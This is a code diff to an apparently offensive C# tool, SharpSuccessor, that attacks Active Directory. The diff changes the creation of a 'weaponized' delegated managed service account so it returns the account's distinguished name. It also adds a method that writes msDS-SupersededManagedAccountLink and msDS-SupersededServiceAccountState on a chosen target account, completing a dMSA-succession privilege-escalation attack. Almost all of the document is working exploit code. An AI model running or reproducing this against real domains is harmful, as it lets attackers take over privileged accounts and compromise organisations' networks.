@@ -33,7 +33,7 @@ namespace SharpSuccessor.Modules
             return accountSid;
         }
 
-        public static void CreatedMSA(string path, string name, string computer, string target)
+        public static string CreatedMSA(string path, string name, string computer, string target)
         {
             Domain currentDomain = Domain.GetCurrentDomain();
             string childName = "CN=" + name;
@@ -47,7 +47,7 @@ namespace SharpSuccessor.Modules
                 Console.WriteLine("[+] Adding dnshostname " + name + "." + currentDomain.Name);
                 newChild.Properties["dnshostname"].Add(name + "." + currentDomain.Name);
                 Console.WriteLine("[+] Adding samaccountname " + name + "$");
-                newChild.Properties["samaccountname"].Add(name+"$");
+                newChild.Properties["samaccountname"].Add(name + "$");
 
                 SearchResultCollection results;
 
@@ -61,7 +61,7 @@ namespace SharpSuccessor.Modules
                 if (results.Count == 0)
                 {
                     Console.WriteLine("[!] Cannot find account");
-                    return ;
+                    return null;
                 }
 
                 string targetdn = null;
@@ -86,7 +86,7 @@ namespace SharpSuccessor.Modules
                 if (sid == null)
                 {
                     Console.WriteLine("[!] Cannot find computer account");
-                    return;
+                    return null;
                 }
                 RawSecurityDescriptor rsd = new RawSecurityDescriptor("O:S-1-5-32-544D:(A;;0xf01ff;;;" + sid + ")");
                 Byte[] descriptor = new byte[rsd.BinaryLength];
@@ -102,11 +102,46 @@ namespace SharpSuccessor.Modules
 
                 Console.WriteLine($"[+] Created dMSA object '{newChild.Name}' in '{path}'");
                 Console.WriteLine("[+] Successfully weaponized dMSA object");
+
+                return newChild.Properties["distinguishedName"].Value.ToString();   
             }
             catch (Exception ex)
             {
                 Console.WriteLine($"Error: {ex.Message}");
+                return null;
+            }
+
+        }
+
+        public static void WriteTarget(string target, string dMSADN)
+        {
+            SearchResultCollection results;
+
+            DirectoryEntry de = new DirectoryEntry();
+            DirectorySearcher ds = new DirectorySearcher(de);
+
+            string query = "(samaccountname=" + target + ")";
+            ds.Filter = query;
+            results = ds.FindAll();
+
+            if (results.Count == 0)
+            {
+                Console.WriteLine("[!] Cannot find target account");
                 return;
+            }
+
+            foreach (SearchResult sr in results)
+            {
+                Console.WriteLine("[+] Found target account, attempting to write attributes");
+                DirectoryEntry mde = sr.GetDirectoryEntry();
+                mde.Properties["msDS-SupersededManagedAccountLink"].Value = dMSADN;
+                Console.WriteLine("[+] " + dMSADN + " written to " + target + " object");
+                mde.Properties["msDS-SupersededServiceAccountState"].Value = 2;
+                Console.WriteLine("[+] msDS-SupersededServiceAccountState set to 2");
+
+                mde.CommitChanges();
+
+                Console.WriteLine("[+] Wrote to target account successfully");
             }
 
         }
